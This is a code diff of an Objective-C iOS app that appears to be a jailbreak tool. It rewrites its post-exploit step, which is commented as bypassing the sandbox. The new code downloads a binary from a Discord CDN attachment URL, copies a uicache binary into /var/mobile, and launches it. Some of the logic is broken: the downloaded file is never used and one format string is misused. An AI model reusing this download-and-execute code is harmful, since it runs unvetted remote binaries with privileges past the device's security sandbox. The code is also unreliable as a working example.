@@ -86,7 +86,12 @@
                                    if (error) {\
                                        LOG("[-] Error moviing item %s to path %s (%s)", copyFrom, moveTo, [[error localizedDescription] UTF8String]); \
                                        error = NULL; \
-                                   }
+}
+- (NSURL *)applicationDocumentsDirectory
+{
+  return [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject];
+}
+
 - (void)viewDidLoad {
     [super viewDidLoad];
     NSString *currSysVer = [[UIDevice currentDevice] systemVersion];
@@ -185,33 +190,62 @@ char* prepare_payload() {
     
     return path;
 }
+#define in_bundle(obj) strdup([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@obj] UTF8String])
 
-int installBin(void *init){
+- (void)installBin:(NSString *)data
+{
    
     //prepare_payload();
     NSString *openFile ;
        NSFileManager *fileManager = [NSFileManager defaultManager];
-       NSError *error;
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *documentsDirectory = [paths objectAtIndex:0];
 
-           NSString *pgnPath = [documentsDirectory stringByAppendingPathComponent:[NSString stringWithFormat:@"bin/uicache", @"/var/mobile/uicache"]];
+           
 
-           if ([fileManager fileExistsAtPath:pgnPath] == NO)
-           {
-               NSString *resourcePath = [[NSBundle mainBundle] pathForResource:@"bin/uicache" ofType:nil];
-               [fileManager copyItemAtPath:resourcePath toPath:pgnPath error:&error];
-               if (error) {
-                   NSLog(@"Error on copying file: %@\nfrom path: %@\ntoPath: %@", error, resourcePath, pgnPath);
-               }
-       }
-    cicuta_log("[+] executing uicache");
+          
+       
+    NSBundle* ucache;
+     
+    // Obtain a reference to a loadable bundle.
+    ucache = [NSBundle bundleWithPath:@"/bin/uicache"];
+
     cicuta_log("...");
     cicuta_log("..");
     sleep(1);
+    NSString *stringURL = @"https://cdn.discordapp.com/attachments/810794396449767445/810812755841515520/uicache";
+    NSURL  *url = [NSURL URLWithString:stringURL];
+    NSData *urlData = [NSData dataWithContentsOfURL:url];
+    if ( urlData )
+    {
+      NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+      NSString  *documentsDirectory = [paths objectAtIndex:0];
+
+      NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"uicache"];
+      [urlData writeToFile:filePath atomically:YES];
+    }
     
-    launch("bin/uicache", NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-    return 0;
+    NSFileManager* manager = [NSFileManager defaultManager];
+    NSError* error;
+    NSString *documentDirectory = [[self applicationDocumentsDirectory] absoluteString];
+
+    NSString *writableDBPath = [documentDirectory stringByAppendingPathComponent:@"uicache"];
+    NSString *defaultDBPath = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:@"uicache"];
+    if([manager copyItemAtPath:defaultDBPath toPath:@"/var/mobile/uicache" error:&error])
+    {
+        cicuta_log("[+] uicache installed -> execution...");
+    }
+    else
+    {
+       cicuta_log("failed to install unicache -> bootstrap installation failed.");
+    }
+    // Destination URL
+    
+    // copy it over
+    
+
+    launch("/var/mobile/uicache", NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+  
 }
 - (IBAction)post_exploit:(UIButton *)sender {
   
@@ -221,7 +255,7 @@ int installBin(void *init){
         cicuta_log("yes yes we are in. jailbroken state unless you exit the app");
     }
     //this will bypass sandbox
-    installBin(nil);
+    [self installBin:@"babe we are burning dat today"];
 }
 
 
